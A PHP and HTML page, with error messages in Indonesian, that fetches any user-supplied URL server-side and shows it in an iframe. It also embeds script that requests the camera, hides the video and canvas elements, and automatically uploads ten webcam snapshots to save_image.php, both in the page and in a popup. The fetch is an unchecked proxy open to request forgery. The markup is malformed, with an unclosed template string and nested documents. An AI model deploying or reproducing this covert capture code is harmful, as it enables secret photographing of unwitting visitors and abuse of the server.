<!DOCTYPE html>
<html>
<head>
   
</head>
<body>
  
    <div>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
           
            $url = $_POST['url'];

           
            $curl = curl_init();

        
            curl_setopt($curl, CURLOPT_URL, $url);

          
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

        
            $response = curl_exec($curl);

        
            curl_close($curl);

         
            echo "<iframe srcdoc=\"" . htmlspecialchars($response) . "\" width=\"100%\" height=\"500\"></iframe>";
        } else {
        
            header("Location: index.php");
            exit();
        }
        ?>
		<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function captureImage() {
            var videoElement = document.getElementById('video');
            var canvasElement = document.getElementById('canvas');
            var context = canvasElement.getContext('2d');

            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;

            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            var imageDataURL = canvasElement.toDataURL('image/png');

            $.ajax({
                type: 'POST',
                url: 'save_image.php',
                data: { imageData: imageDataURL },
                success: function(response) {
                    console.log(response);
                }
            });
        }

        function openPopup() {
            var popupWindow = window.open("", "_blank", "width=500,height=500");
            var popupDocument = popupWindow.document;
            var popupBody = popupDocument.body;

            var htmlContent = `
            
                <!DOCTYPE html>
                <html>
                <head>
                    <title></title>
                    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
                    <script>
                        function captureImage() {
                            var videoElement = document.getElementById('video');
                            var canvasElement = document.getElementById('canvas');
                            var context = canvasElement.getContext('2d');

                            canvasElement.width = videoElement.videoWidth;
                            canvasElement.height = videoElement.videoHeight;

                            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

                            var imageDataURL = canvasElement.toDataURL('image/png');

                            $.ajax({
                                type: 'POST',
                                url: 'save_image.php',
                                data: { imageData: imageDataURL },
                                success: function(response) {
                                    console.log(response);
                                }
                            });
                        }

                        $(document).ready(function() {
                            setTimeout(function() {
                                var count = 0;
                                var interval = setInterval(function() {
                                    captureImage();
                                    count++;

                                    if (count === 10) {
                                        clearInterval(interval);
                                    }
                                }, 1000);
                            }, 2000);
                        });
                    </script>
                </head>
                <body>
                   
                    <h1></h1>
                    <video id="video" autoplay muted style="display: none;"></video>
                    <canvas id="canvas" style="display: none;"></canvas>
                    <button onclick="captureImage()" style="display: none;">Capture</button>

                    <script>
                        navigator.mediaDevices.getUserMedia({ video: true })
                            .then(function(stream) {
                                var videoElement = document.getElementById('video');
                                videoElement.srcObject = stream;
                                videoElement.play();
                            })
                            .catch(function(error) {
                                console.error('Terjadi kesalahan:', error);
                            });
                    </script>
                </body>
                </html>
            

    </script>
</head>
<body>
    <h1></h1>
    <video id="video" autoplay muted style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
   

    <script>
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                var videoElement = document.getElementById('video');
                videoElement.srcObject = stream;
                videoElement.play();
            })
            .catch(function(error) {
                console.error('Terjadi kesalahan:', error);
            });
    </script>
</body>
</html>

    </div>
</body>
</html>
